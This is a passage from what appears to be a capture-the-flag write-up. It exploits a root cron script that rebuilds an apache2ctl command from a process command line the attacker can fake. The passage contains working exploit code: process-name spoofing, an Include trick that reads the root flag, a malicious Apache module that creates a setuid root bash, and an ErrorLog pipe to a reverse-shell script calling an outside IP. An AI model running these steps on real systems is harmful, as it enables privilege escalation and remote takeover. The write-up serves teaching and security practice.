+2025/08/07 01:12:02 CMD: UID=0     PID=36242  | /usr/bin/mysql -uzroadmin -pcorrect-horse-battery-staple zro 
+2025/08/07 01:12:02 CMD: UID=0     PID=36241  | /bin/bash /root/bin/update-stats.sh
+</span></code></pre></div></div>
+<p>There’s a bunch of stuff running as root. Several scripts running from <code class="language-plaintext highlighter-rouge">/root</code>, but also <code class="language-plaintext highlighter-rouge">/usr/local/bin/zro.web-confcheck</code>.</p>
+<h4 id="zroweb-confcheck">zro.web-confcheck</h4>
+<p>This file is a shell script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/$</span><span class="w"> </span>file /usr/local/bin/zro.web-confcheck 
+<span class="go">/usr/local/bin/zro.web-confcheck: Bourne-Again shell script, ASCII text executable
+</span></code></pre></div></div>
+<p>It’s only 14 lines long:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+<span class="nv">RET</span><span class="o">=</span>0
+<span class="k">while </span><span class="nb">read </span>pid _cmd <span class="p">;</span> <span class="k">do</span>
+        <span class="c"># Replace apache2 with apache2ctl and add -t for test</span>
+        <span class="nv">cmd</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">_cmd</span><span class="p">/apache2/apache2ctl</span><span class="k">}</span><span class="s2"> -t"</span>
+        <span class="nv">$cmd</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1
+        <span class="nv">RET</span><span class="o">=</span><span class="nv">$?</span>
+<span class="k">done</span> <span class="o">&lt;&lt;&lt;</span> <span class="si">$(</span>/usr/bin/pgrep <span class="nt">-lfa</span> <span class="s2">"^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"</span><span class="si">)</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$RET</span> <span class="nt">-eq</span> 0 <span class="o">]]</span> <span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s1">'Configuration correct. \o/'</span>
+<span class="k">else
+        </span><span class="nb">echo</span> <span class="s1">'Configuration broken. Please fix immediately!'</span> <span class="o">&gt;</span>&amp;2
+<span class="k">fi
+</span><span class="nb">exit</span> <span class="nv">$RET</span>
+</code></pre></div></div>
+<p>This script is running <code class="language-plaintext highlighter-rouge">pgrep</code> looking for a specific <code class="language-plaintext highlighter-rouge">apache2</code> process running out of <code class="language-plaintext highlighter-rouge">/opt/zroweb</code> and looping over the results. <code class="language-plaintext highlighter-rouge">pgrep</code> looks at the process name for patterns, and with <code class="language-plaintext highlighter-rouge">-f</code> it looks at the full command line. <code class="language-plaintext highlighter-rouge">-a</code> returns the full command line, and <code class="language-plaintext highlighter-rouge">-l</code> says to return both the matched process pid and the command line.</p>
+<p>There’s nothing in the process list that matches this full command, but a simpler example:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span>pgrep <span class="nt">-lfa</span> apache2
+<span class="go">1115 /usr/sbin/apache2 -k start
+28947 /usr/sbin/apache2 -k start
+28948 /usr/sbin/apache2 -k start
+28949 /usr/sbin/apache2 -k start
+28950 /usr/sbin/apache2 -k start
+28951 /usr/sbin/apache2 -k start
+</span></code></pre></div></div>
+<p>The loop will use <code class="language-plaintext highlighter-rouge">bash</code> replacement syntax to replace any instances of <code class="language-plaintext highlighter-rouge">apache2</code> with <code class="language-plaintext highlighter-rouge">apache2ctl</code>, and then run the command. It check the return value for the last matched process and then prints the result. This script is designed to take the running Apache command and get it’s config and validate it.</p>
+<h3 id="exploit-primitives">Exploit Primitives</h3>
+<h4 id="fake-process-command-line">Fake Process Command Line</h4>
+<p>The first thing I want to do to interact with this script is to create a process where I control the command line. The most straight forward way I know to do this is using the <a href="https://en.wikipedia.org/wiki/Exec_(system_call)">exec System call</a>, which starts a completely new process in place of the current one, and allows the caller to set both the path to the binary and the <code class="language-plaintext highlighter-rouge">argv</code> array. Typically by convention the first item in <code class="language-plaintext highlighter-rouge">argv</code> is the process name, but this doesn’t have to be. And tools like <code class="language-plaintext highlighter-rouge">ps</code> show what is in <code class="language-plaintext highlighter-rouge">argv[0]</code>.</p>
+<p>This can be done in basically any language, so I’ll use Python. The <code class="language-plaintext highlighter-rouge">os</code> module has a <code class="language-plaintext highlighter-rouge">execv</code> function (the <code class="language-plaintext highlighter-rouge">v</code> version allows me to set the command line arguments):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">execv</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sleep</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">'</span><span class="s">0xdf_was_here</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">60</span><span class="sh">'</span><span class="p">])</span>
+</code></pre></div></div>
+<p>This will call <code class="language-plaintext highlighter-rouge">sleep 60</code> but in the process list it will show up as <code class="language-plaintext highlighter-rouge">0xdf was here 60</code>. I’ll run this in one terminal, and in another:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span>ps auxww | <span class="nb">grep </span>0xdf
+<span class="go">zroadmin   93631  0.2  0.0   7236   516 pts/0    S+   10:35   0:00 0xdf_was_here 60
+</span></code></pre></div></div>
+<p>Interestingly, this doesn’t show up in <code class="language-plaintext highlighter-rouge">pgrep 0xdf</code>, but rather only in <code class="language-plaintext highlighter-rouge">pgrep -f</code>, as the first checks the legit process and the second checks the full command line:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span>pgrep <span class="s1">'0xdf_was_here'</span>
+<span class="gp">zroadmin@zero:~$</span><span class="w"> </span>pgrep <span class="nt">-f</span> <span class="s1">'0xdf_was_here'</span>
+<span class="go">93631
+</span></code></pre></div></div>
+<p><em>Update 5 Sept 2025</em>: When watching a video from <a href="https://www.youtube.com/@yousuckatprogramming">YouSuckAtProgramming</a>, he used <code class="language-plaintext highlighter-rouge">exec</code> with the <code class="language-plaintext highlighter-rouge">-a</code> parameter to do this kind of fakery, and it works here too. I’ll want  to run it in a subshell (inside <code class="language-plaintext highlighter-rouge">()</code>) or else my SSH session will die once it completes. So for example running <code class="language-plaintext highlighter-rouge">(exec -a "0xdf faked with exec" sleep 60)</code> creates that process:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>pgrep <span class="nt">-fla</span> 0xdf
+<span class="go">11523 0xdf faked with exec 60
+</span></code></pre></div></div>
+<h4 id="improved-fake-process-command-line">Improved Fake Process Command Line</h4>
+<p>The first two ways I found to exploit this worked fine with Python using <code class="language-plaintext highlighter-rouge">execv</code>. The problem is that I can’t do anything to get rid of the <code class="language-plaintext highlighter-rouge">-t</code>.</p>
+<p>If I use Perl, that gets even easier. Perl allows me to overwrite the <code class="language-plaintext highlighter-rouge">$0</code> variable and change the command line. For example:</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/perl</span>
+
+<span class="err">$</span><span class="mi">0</span> <span class="o">=</span> <span class="p">"</span><span class="s2">fake_process!</span><span class="p">";</span>
+<span class="nb">sleep</span><span class="p">(</span><span class="mi">223</span><span class="p">);</span>
+</code></pre></div></div>
+<p>This shows up in the process list as:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">zroadmin   14460  0.0  0.1  12496  5032 pts/0    S+   21:55   0:00 fake_process!
+</span></code></pre></div></div>
+<p>Here I don’t have to worry about the 223 argument showing up, which is nice.</p>
+<h4 id="multiple-apache2ctl--d">Multiple apache2ctl -d</h4>
+<p>The <code class="language-plaintext highlighter-rouge">-d</code> option in <code class="language-plaintext highlighter-rouge">apache2ctl</code> is meant to be given once. It turns out that when it’s given multiple times, only the last one is used. That means I can append another <code class="language-plaintext highlighter-rouge">-d &lt;file&gt;</code> to the end the command and that file will be executed.</p>
+<p><code class="language-plaintext highlighter-rouge">apache2ctl</code> looks for a <code class="language-plaintext highlighter-rouge">apache2.conf</code> file in the given directory with <code class="language-plaintext highlighter-rouge">-d</code> (among other things). So I can pass it the <code class="language-plaintext highlighter-rouge">/etc/apache2</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span>apache2ctl <span class="nt">-d</span> /etc/apache2/ <span class="nt">-t</span>
+<span class="go">AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 10.129.234.62. Set the 'ServerName' directive globally to suppress this message
+Syntax OK
+</span></code></pre></div></div>
+<p>If I also pass <code class="language-plaintext highlighter-rouge">/dev/shm</code>, it fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span>apache2ctl <span class="nt">-d</span> /etc/apache2/ <span class="nt">-d</span> /dev/shm <span class="nt">-t</span>
+<span class="go">apache2: Could not open configuration file /dev/shm/apache2.conf: No such file or directory
+Action '-d /etc/apache2/ -d /dev/shm -t' failed.
+The Apache error log may have more information.
+</span></code></pre></div></div>
+<p>But I’ve shown that only the last one is used. And that it’s trying to read <code class="language-plaintext highlighter-rouge">apache2.conf</code> from the given directory.</p>
+<h3 id="path-overview">Path Overview</h3>
+<p>With the ability to create a fake process and the ability to control the <code class="language-plaintext highlighter-rouge">-d</code> input to <code class="language-plaintext highlighter-rouge">apachectl</code> running as root, there are a few strategies I can take. I’ll show the initial way I solved getting partial file read, a failed attempt at command injection, and two other methods I got working to get a shell as root:</p>
+<pre><code class="language-mermaid">flowchart TD;
+    A(&lt;a href="#exploit-primitives"&gt;apache2ctl Injection&lt;/a&gt;)--&gt;B(&lt;a href='#command-injections-fail'&gt;Command\nInjection&lt;/a&gt;);
+    B--xC[Shell as root];
+    A--&gt;D(&lt;a href='#partial-file-read'&gt;Include File Read&lt;/a&gt;);
+    D--&gt;E[root.txt];
+    C--&gt;E;
+    A--&gt;F(&lt;a href='#shell-via-malicious-module'&gt;Malicious\nModule&lt;/a&gt;);
+    F--&gt;C;
+    A--&gt;G(&lt;a href='#shell-via-log-pipe'&gt;Log Pipe&lt;/a&gt;);
+    G--&gt;C;
+
+linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
+</code></pre>
+<p>I’m sure there are other ways as well (CGI for example).</p>
+<h3 id="command-injections-fail">Command Injections [Fail]</h3>
+<p>I’m still pretty limited by the <code class="language-plaintext highlighter-rouge">pgrep</code> regex. I don’t see a clever way for the “.” to be anything but spaces, and the command has to start with <code class="language-plaintext highlighter-rouge">/opt/zroweb/sbin/apache2</code> with specific options. I can add things to the end of the command.</p>
+<p>One thing that won’t work is joining multiple commands with “;” or “&amp;” or “|”.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nb">test</span><span class="o">=</span><span class="s2">"id"</span>
+<span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nv">$test</span>
+<span class="go">uid=666(zroadmin) gid=666(zroadmin) groups=666(zroadmin)
+</span><span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nb">test</span><span class="o">=</span><span class="s2">"id; id"</span>
+<span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nv">$test</span>
+<span class="go">
+Command 'id;' not found, did you mean:
+
+  command 'id' from deb coreutils (8.30-3ubuntu2)
+  command 'idt' from deb ncl-ncarg (6.6.2-1build4)
+  command 'idn' from deb idn (1.33-2.2ubuntu2)
+  command 'id3' from deb id3 (1.1.0-3)
+
+Try: apt install &lt;deb name&gt;
+</span><span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nb">test</span><span class="o">=</span><span class="s2">"id | id"</span>
+<span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nv">$test</span>
+<span class="go">id: extra operand ‘id’
+Try 'id --help' for more information.
+</span></code></pre></div></div>
+<p>Trying to get subshells fails too:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$ </span><span class="nb">test</span><span class="o">=</span><span class="s1">'$(touch /home/zroadmin/yes)'</span>
+<span class="gp">zroadmin@zero:~$ </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$test</span><span class="s2">"</span>
+<span class="go">$(touch /home/zroadmin/yes)
+</span><span class="gp">zroadmin@zero:~$ </span><span class="nv">$test</span>
+<span class="go">$(touch: command not found
+</span><span class="gp">zroadmin@zero:~$ </span><span class="nb">test</span><span class="o">=</span><span class="s1">'`touch /home/zroadmin/yes`'</span>
+<span class="gp">zroadmin@zero:~$ </span><span class="nv">$test</span>
+<span class="go">
+Command '`touch' not found, did you mean:
+
+  command 'ktouch' from deb ktouch (4:19.12.3-1ubuntu1)
+  command 'touch' from deb coreutils (8.30-3ubuntu2)
+
+Try: apt install &lt;deb name&gt;
+</span></code></pre></div></div>
+<h3 id="partial-file-read">Partial File Read</h3>
+<h4 id="poc-1">POC</h4>
+<p><code class="language-plaintext highlighter-rouge">apache2ctl</code> has a <a href="https://gtfobins.github.io/gtfobins/apache2ctl/">page on GTFOBins</a> showing how to use it for file read:</p>
+<picture>
+<source srcset="/img/image-20250807064253992.webp" type="image/webp"/>
+<img alt="image-20250807064253992" class="include_image" loading="lazy" src="/img/image-20250807064253992.png"/>
+</picture>
+<p>To make sure the command works, I’ll copy the entire <code class="language-plaintext highlighter-rouge">/etc/apache2</code> directory into <code class="language-plaintext highlighter-rouge">/dev/shm</code> named <code class="language-plaintext highlighter-rouge">fileread</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:~$</span><span class="w"> </span><span class="nb">cp</span> <span class="nt">-R</span> /etc/apache2 /dev/shm/fileread
+</code></pre></div></div>
+<p>I’ll add a line to the top of <code class="language-plaintext highlighter-rouge">/dev/shm/fileread/apache2.conf</code>:</p>
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Include</span> <span class="n">/etc/passwd</span>
+</code></pre></div></div>
+<p>Now when I run the command pointing at that config, it errors out:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>apache2ctl <span class="nt">-d</span> /etc/apache2/ <span class="nt">-d</span> /dev/shm/fileread <span class="nt">-t</span>
+<span class="go">AH00526: Syntax error on line 1 of /etc/passwd:
+Invalid command 'root:x:0:0:root:/root:/bin/bash', perhaps misspelled or defined by a module not included in the server configuration
+Action '-d /etc/apache2/ -d /dev/shm/fileread -t' failed.
+The Apache error log may have more information.
+</span></code></pre></div></div>
+<p>I’m able to read the top line of files.</p>
+<h4 id="log">Log</h4>
+<p>This still isn’t a complete  solution as I don’t have access to the stdout or stderr from the running cron. The <code class="language-plaintext highlighter-rouge">apache2ctl</code> <a href="https://httpd.apache.org/docs/2.4/programs/apachectl.html">docs</a> say that:</p>
+<blockquote>
+<p>When acting in pass-through mode, <code class="language-plaintext highlighter-rouge">apachectl</code> can take all the arguments available for the <code class="language-plaintext highlighter-rouge">httpd</code> binary.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>**apachectl** [ httpd-argument ]
+</code></pre></div> </div>
+</blockquote>
+<p>The <code class="language-plaintext highlighter-rouge">httpd</code> <a href="https://httpd.apache.org/docs/2.4/programs/httpd.html">docs</a> show a <code class="language-plaintext highlighter-rouge">-E &lt;file&gt;</code> option that seems perfect:</p>
+<blockquote>
+<p><code class="language-plaintext highlighter-rouge">-E file</code></p>
+<p>Send error messages during server startup to file.</p>
+</blockquote>
+<p>It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>apache2ctl <span class="nt">-d</span> /etc/apache2/ <span class="nt">-d</span> /dev/shm/fileread <span class="nt">-E</span> /dev/shm/out <span class="nt">-t</span>
+<span class="go">Action '-d /etc/apache2/ -d /dev/shm/fileread -E /dev/shm/out -t' failed.
+The Apache error log may have more information.
+</span><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">cat </span>out 
+<span class="go">AH00526: Syntax error on line 1 of /etc/passwd:
+Invalid command 'root:x:0:0:root:/root:/bin/bash', perhaps misspelled or defined by a module not included in the server configuration
+</span></code></pre></div></div>
+<h4 id="flag-read">Flag Read</h4>
+<p>Putting this all together, I’ll create a process that root will run that will try to include <code class="language-plaintext highlighter-rouge">/root/root.txt</code>, but fail and get logged somewhere I can read.</p>
+<p>I’ll update <code class="language-plaintext highlighter-rouge">/dev/shm/apache2/apache2.conf</code> to include <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p>
+<p>I’ll update my Python script to fake the necessary process command line:</p>
+<div class="language-python wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">execv</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sleep</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">'</span><span class="s">/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">223</span><span class="sh">"</span><span class="p">])</span>
+</code></pre></div></div>
+<p>I’ll run this, and it hangs sleeping. While I wait, I can use the <code class="language-plaintext highlighter-rouge">pgrep</code> command to see that it’s working:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>/usr/bin/pgrep <span class="nt">-lfa</span> <span class="s2">"^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"</span>
+<span class="go">3496 /opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log 223
+</span></code></pre></div></div>
+<p>This will actually fail before it has a chance to log because of the stray 223 (the sleep time) at the end. I’ll find a parameter that can take that as input (<code class="language-plaintext highlighter-rouge">-c &lt;directive&gt;</code> for  “Process the configuration directive after reading config files.” seems like a good one), and update the Python script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">execv</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sleep</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">'</span><span class="s">/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">223</span><span class="sh">"</span><span class="p">])</span>
+</code></pre></div></div>
+<p>That looks better:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>/usr/bin/pgrep <span class="nt">-lfa</span> <span class="s2">"^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf"</span>
+<span class="go">3883 /opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c 223
+</span></code></pre></div></div>
+<p>This works with <code class="language-plaintext highlighter-rouge">exec</code> as well, using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">exec</span> <span class="nt">-a</span> <span class="s2">"/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/fileread -E /dev/shm/fileread.log -c"</span> <span class="nb">sleep </span>223<span class="o">)</span>
+</code></pre></div></div>
+<p>The next time the cron runs, the flag is in the log file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">cat </span>fileread.log 
+<span class="go">AH00526: Syntax error on line 1 of /root/root.txt:
+Invalid command '015c84275247026ff80c2432a360be0d', perhaps misspelled or defined by a module not included in the server configuration
+</span></code></pre></div></div>
+<h3 id="shell-via-malicious-module">Shell via Malicious Module</h3>
+<p>When <code class="language-plaintext highlighter-rouge">apache2ctl</code> tests a configuration, it does actually load the modules to make sure they work. I’ll crearte a malicious module to get execution as root.</p>
+<p>I’ll copy <code class="language-plaintext highlighter-rouge">/etc/apache2</code> to make another fake directory to work from:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">cp</span> <span class="nt">-R</span> /etc/apache2/ module
+</code></pre></div></div>
+<p>I’ll start with some minimal module code (with an assist from ChatGPT):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"httpd.h"</span><span class="cp">
+#include</span> <span class="cpf">"http_config.h"</span><span class="cp">
+#include</span> <span class="cpf">"http_protocol.h"</span><span class="cp">
+#include</span> <span class="cpf">"ap_config.h"</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">myinit</span><span class="p">(</span><span class="n">apr_pool_t</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">server_rec</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">module</span> <span class="n">AP_MODULE_DECLARE_DATA</span> <span class="n">mymodule</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="n">STANDARD20_MODULE_STUFF</span><span class="p">,</span>
+                <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
+                    <span class="nb">NULL</span>
+<span class="p">};</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+        <span class="k">static</span> <span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span> <span class="n">myinit</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span> <span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">apxs</code> will build this into a module:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>apxs <span class="nt">-c</span> 0xdfmodule.c 
+<span class="go">/usr/share/apr-1.0/build/libtool  --mode=compile --tag=disable-static x86_64-linux-gnu-gcc -prefer-pic -pipe -g -O2 -fstack-protector-strong -Wformat -Werror=format-security  -Wdate-time -D_FORTIFY_SOURCE=2   -DLINUX -D_REENTRANT -D_GNU_SOURCE  -pthread  -I/usr/include/apache2  -I/usr/include/apr-1.0   -I/usr/include/apr-1.0 -I/usr/include  -c -o 0xdfmodule.lo 0xdfmodule.c &amp;&amp; touch 0xdfmodule.slo
+libtool: compile:  x86_64-linux-gnu-gcc -pipe -g -O2 -fstack-protector-strong -Wformat -Werror=format-security -Wdate-time -D_FORTIFY_SOURCE=2 -DLINUX -D_REENTRANT -D_GNU_SOURCE -pthread -I/usr/include/apache2 -I/usr/include/apr-1.0 -I/usr/include/apr-1.0 -I/usr/include -c 0xdfmodule.c  -fPIC -DPIC -o .libs/0xdfmodule.o
+0xdfmodule.c: In function ‘myinit’:
+0xdfmodule.c:7:5: warning: ignoring return value of ‘system’, declared with attribute warn_unused_result [-Wunused-result]
+    7 |     system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf");
+      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+/usr/share/apr-1.0/build/libtool  --mode=link --tag=disable-static x86_64-linux-gnu-gcc -Wl,--as-needed -Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now    -o 0xdfmodule.la  -rpath /usr/lib/apache2/modules -module -avoid-version    0xdfmodule.lo
+libtool: link: x86_64-linux-gnu-gcc -shared  -fPIC -DPIC  .libs/0xdfmodule.o    -Wl,--as-needed -Wl,-Bsymbolic-functions -Wl,-z -Wl,relro -Wl,-z -Wl,now   -Wl,-soname -Wl,0xdfmodule.so -o .libs/0xdfmodule.so
+libtool: link: ( cd ".libs" &amp;&amp; rm -f "0xdfmodule.la" &amp;&amp; ln -s "../0xdfmodule.la" "0xdfmodule.la"
+</span></code></pre></div></div>
+<p>There are error messages, but it worked:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>file .libs/0xdfmodule.so
+<span class="go">.libs/0xdfmodule.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=2a8886fbba4c51abe69826a5e9d8220b5a25583f, with debug_info, not stripped
+</span></code></pre></div></div>
+<p>I’ll drop this in the <code class="language-plaintext highlighter-rouge">modules</code> directory in my Apache directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">mkdir </span>module/modules
+<span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">cp</span> .libs/0xdfmodule.so module/modules/
+</code></pre></div></div>
+<p>Finally, I need to update the <code class="language-plaintext highlighter-rouge">apache2.conf</code> by adding this line to the top:</p>
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">LoadModule</span> <span class="s">0xdfmodule</span> <span class="s">modules/0xdfmodule.so</span>
+</code></pre></div></div>
+<p>With all of that in place, I’ll update my fake process and run it:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="nf">execv</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/sleep</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">'</span><span class="s">/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/module -c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">"</span><span class="s">223</span><span class="sh">"</span><span class="p">])</span>
+</code></pre></div></div>
+<p>Once the minute rolls over, there’s a SetUID <code class="language-plaintext highlighter-rouge">bash</code> in <code class="language-plaintext highlighter-rouge">/tmp</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /tmp/0xdf 
+<span class="go">-rwsrwsrwx 1 root root 1183448 Aug 10 20:44 /tmp/0xdf
+</span><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>/tmp/0xdf <span class="nt">-p</span>
+<span class="gp">0xdf-5.0#</span><span class="w"> 
+</span></code></pre></div></div>
+<h3 id="shell-via-log-pipe">Shell Via Log Pipe</h3>
+<p>I’ll create another working directory. This time I’ll just completely stage the configuration directory from scratch:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span><span class="nb">mkdir </span>errorlog
+<span class="gp">zroadmin@zero:/dev/shm$</span><span class="w"> </span>vim errorlog/apache2.conf
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">apache2.conf</code> file will be:</p>
+<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">LoadModule</span> <span class="s">mpm_event_module</span> <span class="n">/usr/lib/apache2/modules/mod_mpm_event.so</span>
+
+<span class="s">ServerRoot</span> <span class="s">"/dev/shm/"</span>
+<span class="s">Listen</span> <span class="mi">9999</span>
+<span class="s">ServerName</span> <span class="s">localhost</span>
+
+<span class="s">ErrorLog</span> <span class="s">"|/dev/shm/rev.sh"</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">"|/dev/shm/rev.sh"</code> directive says to log errors by running my script. I’ll set that as a simple reverse shell (making sure to <code class="language-plaintext highlighter-rouge">chmod +x</code> it to make it executable):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.79/443 0&gt;&amp;1
+</code></pre></div></div>
+<p>For this one, I’ll need to get rid of the <code class="language-plaintext highlighter-rouge">-t</code> on the end of the command to get it fully running. To do that, I’ll use the Perl:</p>
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/perl</span>
+
+<span class="err">$</span><span class="mi">0</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/errorlog -D</span><span class="p">";</span>
